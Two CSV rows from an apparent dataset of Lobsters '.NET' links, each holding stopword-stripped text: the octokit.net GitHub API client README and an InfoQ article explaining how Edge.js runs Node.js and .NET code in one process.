638,Lobsters,dotnet,"C#, F#, .NET programming",octokit.net,https://github.com/octokit/octokit.net,octokitnet,octokit github api client library net github api usage example supported platform getting started beta package http ciappveyorcomnugetoctokitnet add add package documentation http octokitnetreadthedocsioenlatest build contribute contributor guideline code conduct problem issue tracker related project copyright license mit license,octokit github api client library net octokit client library targeting net framework net standard provides easy way interact github api usage example get public info specific user var github new githubclient new productheadervalue myamazingapp var user await githubuserget halfogre consolewriteline userfollowers folk love half ogre supported platform getting started octokit github api client library net available nuget installpackage octokit also iobservable based github api client library net using reactive extension installpackage octokitreactive beta package unstable nuget package track master branch repository available http ciappveyorcomnugetoctokitnet xamarin studio find option project context menu add add package documentation documentation available http octokitnetreadthedocsioenlatest build octokit single assembly designed easy deploy anywhere clone build locally click clone desktop button run following git command git clone git githubcom octokitoctokitnetgit octokit cd octokit build library run following command window linuxosx buildsh contribute visit contributor guideline detail contributor expected follow code conduct problem find issue library please visit issue tracker report issue please kind search see issue already logged creating new one pressed time log anyways creating issue clearly explain trying expected happen actually happened step reproduce problem also include information think relevant reproduce problem related project copyright license copyright github inc licensed mit license
639,Lobsters,dotnet,"C#, F#, .NET programming",Run .NET and Node.js code in-process with Edge.js,http://www.infoq.com/articles/the_edge_of_net_and_node,run net nodejs code inprocess edgejs,edgejs project use edgejs npm module related sponsored content performance measurement one scenario net welcome nodejs variety format data function could well instance class let build something using le line adonet code c see sample edgejs github site roadmap edgejs check list work item could use time expertise f python powershell language extensibility model author tomasz janczuk tjanczuk github page blog,edgejs project enables run nodejs net code one process article discus motivation behind project describe basic mechanism edgejs provides explore scenario help develop nodejs application use edgejs many application written exclusively nodejs situation require benefit combination nodejs net may want use net nodejs application several reason net framework nuget package provide rich ecosystem functionality complement nodejs npm module may preexisting net component want reuse nodejs application may want use multithreaded clr run cpubound computation well suited singlethreaded nodejs may prefer use net framework c opposed writing native nodejs extension cc access mechanism specific operating system already exposed nodejs decided application use nodejs net separate nodejs net component process boundary establish form interprocess communication process could http related sponsored content edgejs provides alternative way composing heterogeneous system like one allows run nodejs net code single process provides interop mechanism clr two main benefit using edgejs run nodejs net one process instead splitting application two process better performance reduced complexity performance measurement one scenario show inprocess edgejs call nodejs c time faster call made using http two local process dealing single process instead two process communication channel reduces deployment maintenance complexity need handle net welcome nodejs use basic example calling nodejs c explain key concept edgejs first line import edge module previously installed npm edgejs native nodejs module special edgejs moment loaded start hosting clr inside nodeexe process edge module expose single function called func high level function take clr code parameter return javascript function proxy clr code func function accepts clr code variety format literal source code file name precompiled clr line program specifies async lambda expression literal c code edgejs extract source code compiles inmemory clr assembly creates return javascript proxy function around clr code application assigns hello variable line note compilation done per call edgefunc result cached moreover call edgefunc string literal twice get back instance func object task object cache hello function created edgejs proxy c code called line using standard async pattern nodejs function take single parameter nodejs string callback function accepts error single result value input parameter passed c async lambda expression line expression appends net welcome string line new string constructed c used edgejs result parameter invoking javascript callback function line javascript callback function print console net welcome nodejs edgejs provides prescriptive interop model nodejs net code running inprocess allow javascript directly call clr function clr function must func object task object delegate mechanism allows enough flexibility pas data nodejs net return data net nodejs time requires net code executes asynchronously allows naturally integrated singlethreaded nodejs code func object task object delegate map concept nodejs async pattern interop pattern prevent accessing part net framework often require write extra adapter layer expose desired net functionality func object task object delegate adapter layer requires explicitly address issue blocking apis net possibly running operation clr thread pool avoid blocking nodejs event loop data function although edgejs allows pas one parameter nodejs net parameter may complex type calling net code nodejs edgejs marshal standard javascript type primitive object array passing data net nodejs edgejs marshal atomic clr type well clr object instance list collection dictionary conceptually think passing data clr heap similarly serializing data json one environment deserializing json however edgejs use actual json serialization process instead marshal data clr type system directly memory without intermediate string representation far efficient json serialization deserialization edgejs marshal data value copy data created clr heap execution cross boundary rule one notable exception separately marshaling data value edgejs marshal function reference let look example illustrate powerful concept example nodejs call function implemented c function take two number return sum multiplied purpose example let assume c know add know multiply c code need call back javascript perform multiplication computing sum enable scenario nodejs application define function line pas along two operand c code calling function line notice shape function match prescriptive interop pattern required edgejs enables edgejs create net proxy javascript function func object task object delegate net javascript function proxy called c code line perform multiplication sum computed line function following prescriptive interop pattern also marshaled net nodejs able marshal function either direction clr powerful concept especially combined closure consider following example line edgejs creates javascript function createcounter proxy c lambda expression parameter passed createcounter function line assigned c local variable line interesting part come line result c async lambda expression func object task object delegate instance implementation line includes local variable line closure edgejs marshal func object task object instance back nodejs javascript function assigns counter variable line counter javascript function effectively contains closure clr state proven true line calling counter function twice return ever increasing value result every call func object task object implemented line increasing value local variable line ability marshal function clr combined concept closure powerful mechanism enables net code expose functionality clr object nodejs local variable line last example could well instance person class let build something let look practical example use edgejs nodejs application nodejs singlethreaded architecture blocking code execute part application remain responsive nodejs application execute cpubound computation process external process typically us technology nodejs edgejs make scenario much simpler implement allows nodejs application execute cpubound logic clr thread pool within nodejs process cpubound computation executes clr thread pool thread nodejs application running thread remains responsive cpubound operation finish edgejs synchronizes thread javascript completion callback executed thread consider example using net functionality convert image format convertimagetojpg function us systemdrawing functionality net convert png image jpg format computationally intensive operation therefore c implementation run conversion clr thread pool thread created line call taskrun computation executes singleton thread process free process subsequent event c code wait completion image conversion await keyword line image converted convertimagetojpg complete invoking javascript callback code line thread another example edgejs come handy accessing data m sql none option accessing m sql data available nodejs developer today complete mature adonet functionality net framework edgejs give simple way using adonet nodejs application consider nodejs application line edgejs creates sql function compiling adonet code sqlcsx file sql function accepts string tsql command executes asynchronously using adonet return result back nodejs sqlcsx file support four crud operation m sql database using le line adonet code c implementation sqlcsx file us asynchronous adonet apis access m sql execute tsql command provided nodejs two example represent small portion scenario edgejs help write nodejs application see sample edgejs github site roadmap edgejs open source project licensed apache currently active development contribution welcome check list work item could use time expertise although example article using c edgejs support running code clr language within nodejs application current extension provide support scripting f python powershell language extensibility model allows easily add compiler clr language edgejs currently requires net framework therefore work window however support mono active development enable running edgejs application macos nix addition window author tomasz janczuk software engineer microsoft current focus nodejs window azure worked net framework web service free time engages lot outdoor activity pacific northwest beyond follow twitter tjanczuk check github page read blog information
